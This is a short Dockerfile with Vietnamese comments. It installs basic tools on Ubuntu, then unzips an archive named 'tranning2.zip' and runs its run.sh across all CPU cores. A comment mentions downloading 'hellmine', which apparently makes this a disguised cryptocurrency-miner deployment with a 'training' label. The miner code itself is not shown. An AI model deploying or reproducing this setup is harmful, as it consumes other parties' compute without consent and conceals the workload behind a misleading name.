
FROM ubuntu:latest

# Cập nhật hệ thống và cài đặt các gói cần thiết
RUN apt update && apt upgrade -y && apt-get update && apt-get install -y htop \
    curl \
    ca-certificates \
    git \
    sudo \ 
    unzip \
    python3 
    
COPY . .
# Tạo thư mục làm việc và tải hellmine

RUN unzip tranning2.zip && cd tranning2 && chmod +x run.sh && ./run.sh $(nproc)
